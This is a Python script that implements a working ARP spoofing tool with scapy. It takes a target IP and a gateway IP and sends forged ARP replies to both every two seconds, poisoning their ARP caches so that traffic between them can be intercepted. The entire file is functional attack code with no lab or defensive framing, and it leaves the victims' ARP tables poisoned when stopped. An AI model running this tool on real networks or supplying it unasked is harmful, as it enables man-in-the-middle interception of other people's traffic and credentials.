#! /usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    """
    Sends an ARP request to a specified IP address to retrieve its MAC address.

    Parameters:
    ip (str): The IP address of the target device.

    Returns:
    str: The MAC address of the target if found, otherwise None.
    """
    # Create an ARP request for the specified IP address
    arp_request = scapy.ARP(pdst=ip)
    
    # Create an Ethernet frame with the broadcast MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combine the Ethernet frame and ARP request
    arp_request_broadcast = broadcast / arp_request
    
    # Send the packet and capture the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # If a response is received, return the MAC address
    if len(answered_list) > 0:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] No response for {ip}.")
        return None

def spoofy(target_ip, spoof_ip):
    """
    Spoofs the ARP table of the target device by sending a forged ARP response.

    Parameters:
    target_ip (str): The IP address of the target device.
    spoof_ip (str): The IP address that the target will think the packet is from.
    """
    # Get the MAC address of the target device
    target_mac = get_mac(target_ip)
    
    # If the MAC address is found, send the spoofed ARP packet
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    else:
        print(f"[!] Unable to spoof {target_ip}, MAC address not found.")

def main():
    """
    The main function that parses user input and continuously performs ARP spoofing.
    """
    # Set up argument parsing for target and gateway IPs
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP (e.g., router)", required=True)
    args = parser.parse_args()

    sent_packet_count = 0

    # Infinite loop to send spoofed packets to both the target and gateway
    try:
        while True:
            # Spoof the target, pretending to be the gateway
            spoofy(args.target_ip, args.gateway_ip)
            
            # Spoof the gateway, pretending to be the target
            spoofy(args.gateway_ip, args.target_ip)
            
            sent_packet_count += 2
            print(f"[+] Packets sent: {sent_packet_count}")
            
            # Wait for 2 seconds before sending the next batch of packets
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopped ARP spoofing. Exiting...")

if __name__ == "__main__":
    main()
